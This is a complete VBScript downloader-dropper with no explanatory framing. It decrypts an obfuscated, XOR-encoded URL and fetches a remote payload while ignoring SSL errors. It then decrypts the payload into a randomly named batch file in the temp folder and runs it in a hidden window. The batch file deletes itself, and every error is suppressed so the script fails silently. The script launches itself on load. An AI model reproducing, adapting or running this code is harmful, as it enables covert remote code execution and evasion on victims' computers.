Function HexToString(hexStr)
    On Error Resume Next
    Dim i, result, hexByte
    result = ""
    For i = 1 To Len(hexStr) Step 2
        hexByte = Mid(hexStr, i, 2)
        result = result & Chr(CLng("&H" & hexByte))
        If Err.Number <> 0 Then
            Exit Function
        End If
    Next
    HexToString = result
    On Error GoTo 0
End Function

Function XorDecrypt(ciphertext, key)
    On Error Resume Next
    Dim output, i, keyChar
    output = ""
    For i = 1 To Len(ciphertext)
        keyChar = Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1))
        output = output & Chr(Asc(Mid(ciphertext, i, 1)) Xor keyChar)
        If Err.Number <> 0 Then
            Exit Function
        End If
    Next
    XorDecrypt = output
    On Error GoTo 0
End Function

Function BytesToString(bytes)
    On Error Resume Next
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    If Err.Number <> 0 Then
        ' Fallback: Manual byte conversion
        Dim i, result
        result = ""
        For i = 1 To LenB(bytes)
            result = result & Chr(AscB(MidB(bytes, i, 1)))
        Next
        BytesToString = result
        On Error GoTo 0
        Exit Function
    End If
    stream.Type = 1
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "iso-8859-1"
    BytesToString = stream.ReadText
    stream.Close
    On Error GoTo 0
End Function

Sub DownloadAndExecute()
    On Error Resume Next
    Dim encryptedUrl, payloadUrl, http, bytes, decryptedCMD
    Dim fso, shell, tempFile, batchContent, typeLib, file
    
    ' Error handling wrapper
    If Err.Number <> 0 Then Err.Clear
    
    ' Step 1: Decrypt URL
    encryptedUrl = "3B1C15141C4D7C47060D1B1F260A4F07001A7C2C13050418251C090159033B4735261A307C0A0D0B0D583E0912100A057C18001D0318320C4F060619"
    payloadUrl = XorDecrypt(HexToString(encryptedUrl), "Shadow")
    If Err.Number <> 0 Or Len(payloadUrl) = 0 Then
        Exit Sub
    End If
    
    ' Step 2: Create HTTP object
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then
        ' Fallback to older version
        Set http = CreateObject("MSXML2.XMLHTTP")
        If Err.Number <> 0 Then Exit Sub
    End If
    
    ' Configure HTTP request
    http.setOption(2) = 13056  ' Ignore SSL errors
    http.setTimeouts 30000, 60000, 30000, 120000
    http.Open "GET", payloadUrl, False
    http.Send
    
    ' Step 3: Validate response
    If http.Status <> 200 Then
        Exit Sub
    End If
    
    ' Step 4: Process response
    bytes = http.ResponseBody
    decryptedCMD = XorDecrypt(BytesToString(bytes), "CmdKey")
    If Err.Number <> 0 Or Len(decryptedCMD) = 0 Then
        Exit Sub
    End If
    
    ' Step 5: Create file objects
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    Set typeLib = CreateObject("Scriptlet.TypeLib")
    If Err.Number <> 0 Then Exit Sub
    
    ' Generate temp filename
    tempFile = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".cmd")
    
    ' Step 6: Create batch script with error handling
    batchContent = "@echo off" & vbCrLf & _
                   "set errorlevel=0" & vbCrLf & _
                   "REM Start Commands" & vbCrLf & _
                   decryptedCMD & vbCrLf & _
                   "if %errorlevel% neq 0 echo Execution failed & exit /b %errorlevel%" & vbCrLf & _
                   "timeout /t 3 /nobreak >nul" & vbCrLf & _
                   "del /f /q """ & tempFile & """" & vbCrLf & _
                   "exit /b 0"
    
    ' Write batch file
    Set file = fso.CreateTextFile(tempFile, True)
    file.Write batchContent
    file.Close
    If Err.Number <> 0 Then Exit Sub
    
    ' Step 7: Execute with proper quoting
    shell.Run "cmd /c """ & tempFile & """", 0, False
    
    On Error GoTo 0
End Sub

' Main execution with error protection
On Error Resume Next
DownloadAndExecute
If Err.Number <> 0 Then
    ' Error occurred - could implement fallback here
End If